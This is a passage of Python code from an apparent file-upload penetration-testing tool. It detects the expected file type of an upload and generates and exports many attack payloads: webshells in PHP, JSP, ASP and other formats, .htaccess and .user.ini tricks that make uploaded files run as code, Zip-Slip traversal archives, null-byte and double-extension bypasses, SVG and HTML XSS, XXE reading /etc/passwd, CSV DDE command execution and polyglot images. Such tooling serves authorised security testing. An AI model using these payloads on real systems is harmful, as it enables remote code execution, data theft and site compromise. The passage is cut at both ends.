        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        'relationships/hyperlink" Target="' + _U + '" TargetMode="External"/></Relationships>'),
     "application/xml", "Office _rels external-relationship hyperlink"),
    ("redir_hyperlink.csv", _b(
        'name,link\n=HYPERLINK("' + _U + '","Click to view report")\n'
        'John,=HYPERLINK("' + _U + '","Open")'),
     "text/csv", "CSV =HYPERLINK formula redirect"),
    ("redir_dde.csv", _b(
        '=DDE("cmd","/c start ' + _U + '")\n@SUM(1+1)*cmd|"/c start ' + _U + '"!A0'),
     "text/csv", "CSV DDE command execution"),
    ("redir_field.json", _b(
        '{"redirect":"' + _U + '","url":"' + _U + '","location":"' + _U + '"}'),
     "application/json", "JSON redirect/url/location field (if app follows)"),
    ("redir_proto.json", _b(
        '{"__proto__":{"redirectUrl":"' + _U + '"},"constructor":{"prototype":{"redirect":"' + _U + '"}}}'),
     "application/json", "JSON prototype pollution -> redirect"),
    ("redir_png_polyglot.png",
     PNG + _b('<script>window.location="' + _U + '"</script>'),
     "image/png", "PNG magic bytes + HTML redirect polyglot"),
    ("redir_gif_polyglot.gif",
     GIF + _b('<script>window.location="' + _U + '"</script>'),
     "image/gif", "GIF magic bytes + HTML redirect polyglot"),
    ("redir_webp_svg.webp",
     WEBP + _b('<svg xmlns="http://www.w3.org/2000/svg" onload="window.location=\'' + _U + '\'">'
               '<rect width="1" height="1"/></svg>'),
     "image/webp", "WEBP header + SVG redirect polyglot"),
    ("redir_txt.txt", _b(
        '<meta http-equiv="refresh" content="0;url=' + _U + '">'
        '<script>window.location="' + _U + '"</script>'),
     "text/plain", "TXT with HTML redirect (if served as text/html)"),
]


# ════════════════════════════ PROFILE DETECTION ════════════════════════════ #

_EXCEL_EXTS = {".xlsx", ".xls", ".xlsm", ".xlsb", ".xltx", ".xltm", ".ods", ".csv"}
_DOCX_EXTS  = {".docx", ".docm", ".dotx", ".dotm", ".doc"}
_PPTX_EXTS  = {".pptx", ".pptm", ".potx", ".ppsx", ".ppt"}
_ZIP_EXTS   = {".zip", ".7z", ".rar", ".tar", ".gz", ".tgz", ".jar", ".war", ".apk"}
_IMAGE_EXTS = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp", ".svg", ".ico"}
_PDF_EXTS   = {".pdf"}

_PROFILE_MIME = {
    "excel": ("spreadsheet", "excel", "ms-excel",
              "application/vnd.openxmlformats-officedocument.spreadsheetml",
              "application/vnd.ms-excel", "text/csv"),
    "docx":  ("wordprocessingml", "msword", "application/msword",
              "application/vnd.openxmlformats-officedocument.wordprocessingml"),
    "pptx":  ("presentationml", "powerpoint", "ms-powerpoint",
              "application/vnd.openxmlformats-officedocument.presentationml"),
    "zip":   ("application/zip", "application/x-zip", "application/x-7z",
              "application/java-archive", "application/x-tar", "gzip"),
    "image": ("image/",),
    "pdf":   ("application/pdf",),
}


def infer_upload_profile(form_fields, file_param) -> str:
    """Infer expected file family from curl file name / mime / form meta.
    Returns: excel | docx | pptx | zip | image | pdf | generic"""
    scores = {k: 0 for k in ("excel", "docx", "pptx", "zip", "image", "pdf")}
    blobs = []

    def _score_name_mime(name: str, mime: str, weight: int = 5):
        ext = os.path.splitext(name)[-1].lower()
        if ext in _EXCEL_EXTS: scores["excel"] += weight
        if ext in _DOCX_EXTS:  scores["docx"]  += weight
        if ext in _PPTX_EXTS:  scores["pptx"]  += weight
        if ext in _ZIP_EXTS:   scores["zip"]   += weight
        if ext in _IMAGE_EXTS: scores["image"] += weight
        if ext in _PDF_EXTS:   scores["pdf"]   += weight
        ml = (mime or "").lower()
        for prof, hints in _PROFILE_MIME.items():
            if any(h in ml for h in hints):
                scores[prof] += weight - 1

    # Primary file field weighted highest; other file fields still count
    for f in form_fields:
        if f.get("is_file"):
            name = (f.get("orig_name") or "").lower()
            mime = (f.get("mime") or "").lower()
            blobs.append(name); blobs.append(mime)
            w = 5 if f.get("key") == file_param else 2
            _score_name_mime(name, mime, w)
        else:
            blobs.append((f.get("value") or "").lower())

    joined = " ".join(blobs)
    if any(x in joined for x in (".xlsx", ".xls", ".xlsm", "spreadsheetml",
                                  "ms-excel", "contenttype\":\"application/vnd.openxmlformats-officedocument.spreadsheetml")):
        scores["excel"] += 3
    if any(x in joined for x in (".docx", ".docm", "wordprocessingml", "msword")):
        scores["docx"] += 3
    if any(x in joined for x in (".pptx", ".pptm", "presentationml", "powerpoint")):
        scores["pptx"] += 3
    if any(x in joined for x in (".zip", "application/zip", ".jar", ".war", "7z", ".rar")):
        scores["zip"] += 3
    if any(x in joined for x in (".jpg", ".jpeg", ".png", ".gif", "image/jpeg", "image/png")):
        scores["image"] += 2
    if ".pdf" in joined or "application/pdf" in joined:
        scores["pdf"] += 2

    best = max(scores, key=scores.get)
    return best if scores[best] >= 3 else "generic"


# ════════════════════════════ TEST FILE BUILDER ════════════════════════════ #

def make_test_files(profile: str = "generic"):
    """Generate test files adapted to the inferred upload profile.

    excel | docx | pptx | zip | image | pdf | generic
    """
    files = []
    seen = set()

    def w(filename, content, cat, desc, mime, send_as=None):
        # Deduplicate by logical test id (filename), not send_as — otherwise
        # two .htaccess variants collide and the second is silently dropped.
        if filename in seen:
            return
        seen.add(filename)
        files.append({"filename": filename, "send_filename": send_as or filename,
                      "category": cat, "description": desc,
                      "content_type": mime,
                      "content": content if isinstance(content, bytes) else content.encode()})

    def add_excel_baselines(cat="baseline"):
        w("valid.xlsx", VALID_XLSX, cat, "Legit Excel OOXML (.xlsx)", XLSX_MIME)
        w("valid.xls",  XLS_OLE_STUB, cat, "Legit-looking OLE .xls stub", XLS_MIME)
        w("valid.csv",  b"name,age\nAlice,30\nBob,25", cat, "Legit CSV spreadsheet", "text/csv")

    def add_docx_baselines(cat="baseline"):
        w("valid.docx", VALID_DOCX, cat, "Legit Word OOXML (.docx)", DOCX_MIME)

    def add_pptx_baselines(cat="baseline"):
        w("valid.pptx", VALID_PPTX, cat, "Legit PowerPoint OOXML (.pptx)", PPTX_MIME)

    def add_zip_baselines(cat="baseline"):
        w("valid.zip", VALID_ZIP, cat, "Legit ZIP with readme.txt", ZIP_MIME)
        w("valid_nested.zip", make_valid_zip([
            ("docs/readme.txt", b"nested ok\n"),
            ("data/sample.csv", b"a,b\n1,2\n"),
        ]), cat, "Legit nested-folder ZIP", ZIP_MIME)

    def add_image_baselines(cat="baseline"):
        w("valid.jpg",  JPEG, cat, "Legit JPEG image",  "image/jpeg")
        w("valid.png",  PNG,  cat, "Legit PNG image",   "image/png")
        w("valid.gif",  GIF,  cat, "Legit GIF image",   "image/gif")
        w("valid.webp", WEBP + b"\x00" * 8, cat, "Legit WEBP header", "image/webp")
        w("valid.svg",  b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>',
          cat, "Legit SVG (benign)", "image/svg+xml")

    def add_doc_baselines(cat="baseline"):
        w("valid.pdf",  PDF, cat, "Legit PDF", "application/pdf")
        w("valid.txt",  b"Hello", cat, "Legit text", "text/plain")
        w("valid.html", b"<html><body>Hello</body></html>", cat, "Legit HTML", "text/html")

    def add_wrong_types(*kinds):
        """Small cross-type probes so we confirm the API rejects non-matching families."""
        mapping = {
            "jpg": ("valid.jpg", JPEG, "image/jpeg", "Wrong type: JPEG"),
            "png": ("valid.png", PNG, "image/png", "Wrong type: PNG"),
            "pdf": ("valid.pdf", PDF, "application/pdf", "Wrong type: PDF"),
            "xlsx": ("valid.xlsx", VALID_XLSX, XLSX_MIME, "Wrong type: Excel xlsx"),
            "docx": ("valid.docx", VALID_DOCX, DOCX_MIME, "Wrong type: Word docx"),
            "zip": ("valid.zip", VALID_ZIP, ZIP_MIME, "Wrong type: ZIP"),
        }
        for k in kinds:
            if k in mapping:
                fn, content, mime, desc = mapping[k]
                w(fn, content, "wrong_type", desc, mime)

    def add_docx_attacks():
        w("docx_xxe.docx", DOCX_XXE, "xss_file", "DOCX with XXE in document.xml", DOCX_MIME)
        w("docx_with_shell.docx", _ooxml_plus_shell(VALID_DOCX),
          "archive", "DOCX ZIP + exploit.php entry", DOCX_MIME)
        w("docx_zipslip.docx", _ooxml_plus_shell(VALID_DOCX, "../../../tmp/exploit.php"),
          "archive", "DOCX Zip-Slip path traversal entry", DOCX_MIME)
        w("mime_docx.php", PHP_SECRET, "sol2_mime",
          "PHP body with Word OOXML MIME", DOCX_MIME)
        w("fake_docx.docx", PHP_SECRET, "sol2_mime",
          "PHP content named .docx", DOCX_MIME)
        w("bypass.php.docx", PHP_SYSTEM, "ext_bypass",
          "Double ext .php.docx", DOCX_MIME)
        w("bypass.docx.php", VALID_DOCX, "ext_bypass",
          "Reversed .docx.php", "application/x-php")
        w("trav_docx.docx", VALID_DOCX, "sol3_traversal",
          'filename "../report.docx"', DOCX_MIME, send_as="../report.docx")
        w("nb_docx.php", PHP_SECRET, "sol5_nullbyte",
          'exploit.php%00.docx', DOCX_MIME, send_as="exploit.php%00.docx")
        w("zero_bytes.docx", b"", "size_test", "Zero-byte .docx", DOCX_MIME)

    def add_pptx_attacks():
        w("pptx_with_shell.pptx", _ooxml_plus_shell(VALID_PPTX),
          "archive", "PPTX ZIP + exploit.php entry", PPTX_MIME)
        w("mime_pptx.php", PHP_SECRET, "sol2_mime",
          "PHP body with PowerPoint MIME", PPTX_MIME)
        w("fake_pptx.pptx", PHP_SECRET, "sol2_mime",
          "PHP content named .pptx", PPTX_MIME)
        w("bypass.php.pptx", PHP_SYSTEM, "ext_bypass",
          "Double ext .php.pptx", PPTX_MIME)
        w("trav_pptx.pptx", VALID_PPTX, "sol3_traversal",
          'filename "../deck.pptx"', PPTX_MIME, send_as="../deck.pptx")
        w("zero_bytes.pptx", b"", "size_test", "Zero-byte .pptx", PPTX_MIME)

    def add_zip_attacks():
        w("zip_with_shell.zip", make_valid_zip([
            ("readme.txt", b"ok\n"), ("exploit.php", PHP_SECRET),
        ]), "archive", "ZIP containing exploit.php", ZIP_MIME)
        w("zip_slip.zip", make_valid_zip([
            ("../../../tmp/exploit.php", PHP_SECRET),
        ]), "archive", "Zip-Slip path traversal", ZIP_MIME)
        w("zip_slip_win.zip", make_valid_zip([
            ("..\\..\\..\\tmp\\exploit.php", PHP_SECRET),
        ]), "archive", "Zip-Slip Windows backslash", ZIP_MIME)
        w("zip_double_ext.zip.php", make_valid_zip([("x.txt", b"x")]),
          "ext_bypass", "Archive named .zip.php", "application/x-php",
          send_as="payload.zip.php")
        w("zip_as_xlsx.xlsx", VALID_ZIP, "sol2_mime",
          "Plain ZIP bytes named .xlsx", XLSX_MIME)
        w("mime_zip.php", PHP_SECRET, "sol2_mime",
          "PHP body with application/zip MIME", ZIP_MIME)
        w("fake_zip.zip", PHP_SECRET, "sol2_mime",
          "PHP content named .zip", ZIP_MIME)
        w("trav_zip.zip", VALID_ZIP, "sol3_traversal",
          'filename "../archive.zip"', ZIP_MIME, send_as="../archive.zip")
        w("nb_zip.php", PHP_SECRET, "sol5_nullbyte",
          'exploit.php%00.zip', ZIP_MIME, send_as="exploit.php%00.zip")
        w("zero_bytes.zip", b"", "size_test", "Zero-byte .zip", ZIP_MIME)
        # encrypted-looking / polyglot
        w("zip_html_polyglot.zip",
          VALID_ZIP + b"\n<html><script>alert(1)</script></html>",
          "archive", "ZIP + trailing HTML polyglot", ZIP_MIME)
        w("tar_gz_probe.tar.gz",
          b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03" + b"\x00" * 20,
          "archive", "Gzip/tar magic probe", "application/gzip")
        w("rar_probe.rar",
          b"Rar!\x1a\x07\x00" + b"\x00" * 20,
          "archive", "RAR magic probe", "application/x-rar-compressed")
        w("7z_probe.7z",
          b"7z\xbc\xaf\x27\x1c" + b"\x00" * 20,
          "archive", "7z magic probe", "application/x-7z-compressed")

    def add_excel_attacks():
        # Formula / DDE style content inside real OOXML
        w("xlsx_formula.xlsx", XLSX_FORMULA, "excel_formula",
          "Excel HYPERLINK / DDE-style formula cells", XLSX_MIME)
        w("xlsx_webservice.xlsx", XLSX_EXTERNAL_LINK, "excel_formula",
          "Excel WEBSERVICE() external call", XLSX_MIME)
        w("xss.csv", CSV_FORMULA, "xss_file", "CSV formula injection", "text/csv")
        w("redir_hyperlink.csv",
          _b('name,link\n=HYPERLINK("' + _U + '","Click")\n'),
          "redirect_content", "CSV =HYPERLINK formula redirect", "text/csv")
        w("redir_dde.csv",
          _b('=DDE("cmd","/c start ' + _U + '")\n'),
          "redirect_content", "CSV DDE command execution", "text/csv")
        w("redir_office.rels.xml",
          _b('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
             '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
             'relationships/hyperlink" Target="' + _U + '" TargetMode="External"/></Relationships>'),
          "redirect_content", "Office _rels external hyperlink", "application/xml")

        # MIME / extension bypass framed as Excel
        w("mime_xlsx.php", PHP_SECRET, "sol2_mime",
          "Sol 2: PHP body with Excel OOXML MIME", XLSX_MIME)
        w("mime_xls.php",  PHP_SECRET, "sol2_mime",
          "Sol 2: PHP body with .xls MIME", XLS_MIME)
        w("fake_xlsx.xlsx", PHP_SECRET, "sol2_mime",
          "Sol 2: PHP content named .xlsx", XLSX_MIME)
        w("jpeg_as_xlsx.xlsx", JPEG, "sol2_mime",
          "JPEG magic bytes named .xlsx (content mismatch)", XLSX_MIME)

        # Double-ext / null-byte around Excel names
        w("bypass.php.xlsx", PHP_SYSTEM, "ext_bypass",
          "Double ext .php.xlsx", XLSX_MIME)
        w("bypass.xlsx.php", VALID_XLSX, "ext_bypass",
          "Reversed .xlsx.php (OOXML body)", "application/x-php")
        w("bypass.XLSX", VALID_XLSX, "ext_bypass",
          "Uppercase .XLSX", XLSX_MIME)
        w("nb_xlsx.php", PHP_SECRET, "sol5_nullbyte",
          'Sol 5: "exploit.php%00.xlsx"', XLSX_MIME, send_as="exploit.php%00.xlsx")
        w("nb_xlsx2.php", PHP_SECRET, "sol5_nullbyte",
          'Sol 5: "exploit.xlsx;.php"', XLSX_MIME, send_as="exploit.xlsx;.php")

        # Path traversal with xlsx names
        w("trav_xlsx.xlsx", VALID_XLSX, "sol3_traversal",
          'Sol 3: filename "../report.xlsx"', XLSX_MIME, send_as="../report.xlsx")
        w("trav_xlsx_enc.xlsx", VALID_XLSX, "sol3_traversal",
          'Sol 3: filename "..%2freport.xlsx"', XLSX_MIME, send_as="..%2freport.xlsx")

        # Polyglot / archive: valid OOXML + embedded shell entry
        w("xlsx_with_shell.xlsx",
          make_xlsx_with_extra("exploit.php", PHP_SECRET),
          "archive", "OOXML ZIP containing exploit.php entry (undeclared — POI M.1.14)", XLSX_MIME)
        w("xlsx_shell_declared.xlsx", XLSX_SHELL_DECLARED,
          "archive", "OOXML + exploit.php WITH Content_Types Override (POI-safe)", XLSX_MIME)
        w("xlsx_zipslip.xlsx",
          make_xlsx_with_extra("../../../tmp/exploit.php", PHP_SECRET),
          "archive", "OOXML Zip-Slip path traversal entry", XLSX_MIME)

        w("xxe.xml", XML_XXE, "xss_file", "XML XXE /etc/passwd", "application/xml")
        w("zero_bytes.xlsx", b"", "size_test", "Zero-byte .xlsx", XLSX_MIME)

    def add_extra_cases():
        """High-value cases that were missing from the original suite."""
        # Office Word OOXML
        w("valid.docx", VALID_DOCX, "baseline", "Legit Word OOXML (.docx)", DOCX_MIME)
        w("docx_xxe.docx", DOCX_XXE, "xss_file", "DOCX with XXE in document.xml", DOCX_MIME)
        _dbuf = io.BytesIO()
        with zipfile.ZipFile(io.BytesIO(VALID_DOCX), "r") as src, \
             zipfile.ZipFile(_dbuf, "w", compression=zipfile.ZIP_DEFLATED) as dst:
            for info in src.infolist():
                dst.writestr(info, src.read(info.filename))
            dst.writestr("exploit.php", PHP_SECRET)
        w("docx_with_shell.docx", _dbuf.getvalue(), "archive",
          "DOCX ZIP + exploit.php entry", DOCX_MIME)

        # More server-side script / CGI extensions
        w("shell.asp",  ASP_SHELL,  "sol1_basic", "Classic ASP webshell", "application/x-asp")
        w("shell.cer",  ASP_SHELL,  "sol1_basic", "IIS .cer → ASP trick", "application/x-x509-ca-cert")
        w("shell.shtml", SSI_SHELL, "sol1_basic", "SSI exec/include (.shtml)", "text/html")
        w("shell.cfm",  CFM_SHELL,  "sol1_basic", "ColdFusion cfexecute", "application/x-coldfusion")
        w("shell.py",   PY_SHELL,   "sol1_basic", "Python CGI/script", "text/x-python")
        w("shell.sh",   SH_SHELL,   "sol1_basic", "Shell script", "application/x-sh")
        w("shell.cgi",  CGI_SHELL,  "sol1_basic", "CGI shell script", "application/x-cgi")
        w("shell.jspx", JSP_SHELL,  "sol1_basic", "JSPX webshell", "application/x-jsp")
        w("shell.phar", PHP_SYSTEM, "sol1_basic", "PHP phar archive/script", "application/x-php")

        # Config / server files
        w("dot_user.ini", b"auto_prepend_file=exploit.php\n", "dangerous",
          ".user.ini auto_prepend_file", "text/plain", send_as=".user.ini")
        w("php.ini", b"auto_prepend_file=shell.php\nallow_url_include=On\n", "dangerous",
          "php.ini upload", "text/plain")
        w("web.xml", b'<?xml version="1.0"?><web-app><servlet-mapping><url-pattern>*.php</url-pattern></servlet-mapping></web-app>',
          "dangerous", "Java web.xml", "text/xml")
        w("htpasswd", b"admin:$apr1$r31.....$x", "dangerous", ".htpasswd", "text/plain", send_as=".htpasswd")
        w("credentials.json", b'{"aws_key":"AKIA...","secret":"x","password":"admin"}',
          "dangerous", "credentials.json secrets file", "application/json")
        w("package.json", b'{"name":"pwn","scripts":{"preinstall":"id"}}',
          "dangerous", "package.json with preinstall script", "application/json")

        # SVG XXE + polyglots
        w("svg_xxe.svg", SVG_XXE, "svg_xss", "SVG XXE file:///etc/passwd", "image/svg+xml")
        w("pdf_jpeg_polyglot.pdf", JPEG + PDF, "sol6_exif",
          "JPEG magic + PDF body polyglot (.pdf)", "application/pdf")
        w("pdf_jpeg_polyglot.jpg", JPEG + PDF, "sol6_exif",
          "JPEG magic + PDF body polyglot (.jpg)", "image/jpeg")
        w("phar_jpg.jpg", b"<?php __HALT_COMPILER(); ?>" + JPEG,
          "sol6_exif", "PHP phar stub + JPEG polyglot", "image/jpeg")

        # AV / size / unicode filename
        w("eicar.com.txt", EICAR, "dangerous", "EICAR antivirus test file", "text/plain")
        w("eicar.jpg", JPEG + b"\n" + EICAR, "dangerous",
          "EICAR appended after JPEG magic", "image/jpeg")
        w("large_512kb.bin", b"A" * (512 * 1024), "size_test",
          "512KB oversized probe", "application/octet-stream")
        w("unicode_rtl.php", PHP_SECRET, "ext_bypass",
          "RTL override in filename (‮.php.jpg visual trick)",
          "image/jpeg", send_as="safe\u202e.php.jpg")
        w("spaces.php", PHP_SECRET, "ext_bypass",
          'Filename with trailing spaces "shell.php  "',
          "application/x-php", send_as="shell.php  ")
        w("bypass.phtml.jpg", PHP_SYSTEM, "ext_bypass",
          "Double ext .phtml.jpg", "image/jpeg")
        w("bypass.phar.jpg", PHP_SYSTEM, "ext_bypass",
          "Double ext .phar.jpg", "image/jpeg")
        w("bypass.asp;.jpg", ASP_SHELL, "sol5_nullbyte",
          'IIS semicolon "shell.asp;.jpg"', "image/jpeg", send_as="shell.asp;.jpg")

        # Extra archives
        jbuf = io.BytesIO()
        with zipfile.ZipFile(jbuf, "w") as zf:
            zf.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\n")
            zf.writestr("exploit.php", PHP_SECRET.decode())
        w("shell.jar", jbuf.getvalue(), "archive", "JAR containing exploit.php", "application/java-archive")
        wbuf = io.BytesIO()
        with zipfile.ZipFile(wbuf, "w") as zf:
            zf.writestr("WEB-INF/web.xml", "<web-app/>")
            zf.writestr("exploit.jsp", JSP_SHELL.decode())
        w("shell.war", wbuf.getvalue(), "archive", "WAR containing exploit.jsp", "application/java-archive")

        # Symlink-style zip (stored as symlink if supported — best-effort path)
        sbuf = io.BytesIO()
        with zipfile.ZipFile(sbuf, "w") as zf:
            info = zipfile.ZipInfo("link_to_passwd")
            info.create_system = 3  # Unix
            info.external_attr = (0o120777 << 16)  # symlink
            zf.writestr(info, "/etc/passwd")
            zf.writestr("readme.txt", "symlink probe")
        w("symlink.zip", sbuf.getvalue(), "archive",
          "ZIP with Unix symlink → /etc/passwd", "application/zip")

        # BMP / ICO baselines
        bmp = (b"BM" + struct.pack("<IHHIIIIHHIIIIII", 70, 0, 0, 54, 40, 1, 1, 1, 24, 0, 0, 0, 0, 0, 0)
               + b"\xff\x00\x00" + b"\x00")
        w("valid.bmp", bmp, "baseline", "Legit 1x1 BMP", "image/bmp")
        ico = b"\x00\x00\x01\x00\x01\x00\x01\x01\x00\x00\x01\x00\x18\x00" + struct.pack("<II", 40, 22) + b"\x00" * 40
        w("valid.ico", ico, "baseline", "Legit ICO header", "image/x-icon")

    def add_classic_attacks(image_framed=True):
        mime_img = "image/jpeg" if image_framed else XLSX_MIME
        w("exploit.php", PHP_SECRET, "sol1_basic", "Sol 1: PHP file reader", "application/x-php")
        w("shell.php",   PHP_SYSTEM, "sol1_basic", "Sol 1: PHP system() shell", "application/x-php")
        w("shell.phtml", PHP_SYSTEM, "sol1_basic", "Sol 1: .phtml extension", "application/x-php")
        w("shell.php5",  PHP_SYSTEM, "sol1_basic", "Sol 1: .php5 extension", "application/x-php")
        w("shell.jsp",   JSP_SHELL,  "sol1_basic", "Sol 1: JSP webshell", "application/x-jsp")
        w("shell.aspx",  ASPX_SHELL, "sol1_basic", "Sol 1: ASPX webshell", "application/x-aspx")

        w("mime_jpg.php", PHP_SECRET, "sol2_mime", "Sol 2: PHP as image/jpeg", "image/jpeg")
        w("mime_png.php", PHP_SECRET, "sol2_mime", "Sol 2: PHP as image/png",  "image/png")
        w("mime_gif.php", PHP_SECRET, "sol2_mime", "Sol 2: PHP as image/gif",  "image/gif")
        w("mime_pdf.php", PHP_SECRET, "sol2_mime", "Sol 2: PHP as application/pdf", "application/pdf")

        w("trav_plain.php",  PHP_SECRET, "sol3_traversal", 'Sol 3: filename "../exploit.php"',     "application/x-php", send_as="../exploit.php")
        w("trav_urlenc.php", PHP_SECRET, "sol3_traversal", 'Sol 3: filename "..%2fexploit.php"',    "application/x-php", send_as="..%2fexploit.php")
        w("trav_dblenc.php", PHP_SECRET, "sol3_traversal", 'Sol 3: filename "..%252fexploit.php"',  "application/x-php", send_as="..%252fexploit.php")
        w("trav_win.php",    PHP_SECRET, "sol3_traversal", 'Sol 3: filename "..\\exploit.php"',     "application/x-php", send_as="..\\exploit.php")
        w("trav_passwd.txt", b"root:x:0:0", "sol3_traversal", 'Sol 3: filename "../../../etc/passwd"', "text/plain", send_as="../../../etc/passwd")

        w("htaccess_l33t", b"AddType application/x-httpd-php .l33t", "sol4_htaccess",
          "Sol 4: .htaccess maps .l33t → PHP", "text/plain", send_as=".htaccess")
        w("exploit.l33t",  PHP_SECRET, "sol4_htaccess", "Sol 4: PHP as .l33t (image MIME)", mime_img)
        w("htaccess_jpg",  b"AddType application/x-httpd-php .jpg", "sol4_htaccess",
          "Sol 4: .htaccess maps .jpg → PHP", "text/plain", send_as=".htaccess")

        w("nb1.php", PHP_SECRET, "sol5_nullbyte", 'Sol 5: "exploit.php%00.jpg"',   "image/jpeg", send_as="exploit.php%00.jpg")
        w("nb2.php", PHP_SECRET, "sol5_nullbyte", 'Sol 5: "exploit.php%2500.jpg"', "image/jpeg", send_as="exploit.php%2500.jpg")
        w("nb3.php", PHP_SECRET, "sol5_nullbyte", 'Sol 5: "exploit.asp;.jpg" (IIS)', "image/jpeg", send_as="exploit.asp;.jpg")
        w("nb4.php", PHP_SECRET, "sol5_nullbyte", 'Sol 5: "exploit.php." trailing dot', "image/jpeg", send_as="exploit.php.")

        w("exif_secret.php", make_exif_polyglot(PHP_SECRET), "sol6_exif", "Sol 6: JPEG EXIF comment = PHP (.php)", "image/jpeg")
        w("exif_secret.jpg", make_exif_polyglot(PHP_SECRET), "sol6_exif", "Sol 6: EXIF polyglot as .jpg", "image/jpeg")
        w("gif_polyglot.php", GIF + b"\n" + PHP_SECRET, "sol6_exif", "Sol 6: GIF89a + PHP (.php)", "image/gif")
        w("png_polyglot.php", PNG + PHP_SECRET, "sol6_exif", "Sol 6: PNG bytes + PHP (.php)", "image/png")

        for fn, desc in (("bypass.php.jpg","Double ext .php.jpg"), ("bypass.jpg.php","Reversed .jpg.php"),
                         ("bypass.pHp","Case bypass .pHp"), ("bypass.PHP","Uppercase .PHP"),
                         ("bypass.php7","ext .php7"), ("bypass.php.","Trailing dot .php.")):
            w(fn, PHP_SYSTEM, "ext_bypass", desc, "image/jpeg")

        for name, payload in SVG_VARIANTS.items():
            w(f"svg_{name}.svg", payload, "svg_xss", f"SVG XSS: {name.replace('_',' ')}", "image/svg+xml")
        w("svg_as_jpg.jpg", SVG_VARIANTS["onload_alert"], "svg_xss", "SVG XSS disguised as .jpg", "image/jpeg")
        w("svg_as_png.png", SVG_VARIANTS["script_tag"],   "svg_xss", "SVG XSS disguised as .png", "image/png")

        w("xss.html",  HTML_XSS,    "xss_file", "HTML <script> XSS", "text/html")
        w("xxe.xml",   XML_XXE,     "xss_file", "XML XXE /etc/passwd", "application/xml")
        w("xss.pdf",   PDF_JS,      "xss_file", "PDF JavaScript alert", "application/pdf")
        w("xss.csv",   CSV_FORMULA, "xss_file", "CSV formula injection", "text/csv")
        w("xss.txt",   b"<script>alert(document.domain)</script>", "xss_file", "XSS in .txt", "text/plain")
        w("xss.json",  b'{"__proto__":{"xss":"<script>alert(1)</script>"}}', "xss_file", "JSON proto-pollution XSS", "application/json")

        for fn, content, mime, desc in REDIRECT_FILES:
            w(fn, content, "redirect_content", desc, mime)

        w(".env", b"DB_PASS=secret\nSECRET_KEY=abc", "dangerous", ".env credential file", "text/plain")
        w("web.config", b'<configuration><system.webServer><handlers><add name="php" path="*.php" verb="*"/></handlers></system.webServer></configuration>',
          "dangerous", "IIS web.config → PHP", "text/xml")
        w("index.php", PHP_SYSTEM, "dangerous", "index.php overwrite", "application/x-php")

        z1 = io.BytesIO()
        with zipfile.ZipFile(z1, "w") as zf: zf.writestr("exploit.php", PHP_SECRET.decode())
        w("zip_with_shell.zip", z1.getvalue(), "archive", "ZIP containing exploit.php", "application/zip")
        z2 = io.BytesIO()
        with zipfile.ZipFile(z2, "w") as zf: zf.writestr("../../../tmp/exploit.php", PHP_SECRET.decode())
        w("zip_slip.zip", z2.getvalue(), "archive", "Zip-Slip path traversal", "application/zip")

        w("zero_bytes.jpg", b"", "size_test", "Zero-byte file", "image/jpeg")

    # ── Assemble by profile (no conflicts: shared helpers + seen[] dedupe) ──
    if profile == "excel":
        add_excel_baselines("baseline")
        add_wrong_types("jpg", "png", "pdf", "docx", "zip")
        add_excel_attacks()
        add_classic_attacks(image_framed=False)
        add_extra_cases()
    elif profile == "docx":
        add_docx_baselines("baseline")
        add_pptx_baselines("cross_type")
        add_wrong_types("jpg", "pdf", "xlsx", "zip")
        add_docx_attacks()
        add_classic_attacks(image_framed=False)
        add_extra_cases()
    elif profile == "pptx":
        add_pptx_baselines("baseline")
        add_docx_baselines("cross_type")
        add_wrong_types("jpg", "pdf", "xlsx", "zip")
        add_pptx_attacks()
        add_classic_attacks(image_framed=False)
        add_extra_cases()
    elif profile == "zip":
        add_zip_baselines("baseline")
        add_wrong_types("jpg", "pdf", "xlsx", "docx")
        add_zip_attacks()
        add_classic_attacks(image_framed=False)
        add_extra_cases()
    elif profile == "image":
        add_image_baselines("baseline")
        add_doc_baselines("baseline")
        add_excel_baselines("cross_type")
        add_docx_baselines("cross_type")
        add_zip_baselines("cross_type")
        add_classic_attacks(image_framed=True)
        add_excel_attacks()
        add_docx_attacks()
        add_zip_attacks()
        add_extra_cases()
    elif profile == "pdf":
        w("valid.pdf", PDF, "baseline", "Legit PDF", "application/pdf")
        add_doc_baselines("baseline")
        add_image_baselines("cross_type")
        add_excel_baselines("cross_type")
        add_docx_baselines("cross_type")
        add_zip_baselines("cross_type")
        add_classic_attacks(image_framed=True)
        add_excel_attacks()
        add_docx_attacks()
        add_zip_attacks()
        add_extra_cases()
    else:  # generic — full coverage
        add_image_baselines("baseline")
        add_excel_baselines("baseline")
        add_docx_baselines("baseline")
        add_pptx_baselines("baseline")
        add_zip_baselines("baseline")
        add_doc_baselines("baseline")
        add_classic_attacks(image_framed=True)
        add_excel_attacks()
        add_docx_attacks()
        add_pptx_attacks()
        add_zip_attacks()
        add_extra_cases()

    return files


def _safe_disk_name(tf: dict) -> str:
    """Filesystem-safe name; preserves uniqueness. Real upload name is in MANIFEST."""
    name = tf.get("send_filename") or tf["filename"]
    name = (name.replace("..", "dotdot")
                .replace("/", "_")
                .replace("\\", "_")
                .replace("\x00", "_null_")
                .replace("%00", "_null_")
                .replace("%", "_pct_")
                .replace("\u202e", "_RTL_")
                .replace(" ", "_"))
    if name.startswith("."):
        name = "dot_" + name[1:]
    if not name.strip("._"):
        name = tf["filename"]
    # keep extension from logical filename when send_as is wild
    if "." not in name and "." in tf["filename"]:
        name = name + os.path.splitext(tf["filename"])[1]
    return name


def export_test_files(out_dir: str, profile: str = "generic") -> dict:
    """Write every test payload to disk + MANIFEST.csv for manual testing."""
    os.makedirs(out_dir, exist_ok=True)
    test_files = make_test_files(profile)
    used, rows = {}, []
    for i, tf in enumerate(test_files, 1):
        disk = _safe_disk_name(tf)
        # macOS APFS/HFS often case-insensitive — avoid bypass.php vs bypass.PHP clash
        base_key = disk.lower()
        if base_key in used:
            stem, ext = os.path.splitext(disk)
            n = 2
            while f"{stem}_{n}{ext}".lower() in used:
                n += 1
            disk = f"{stem}_{n}{ext}"
            base_key = disk.lower()
        used[base_key] = True
        path = os.path.join(out_dir, disk)
        with open(path, "wb") as f:
            f.write(tf["content"])
        rows.append({
            "n": i,
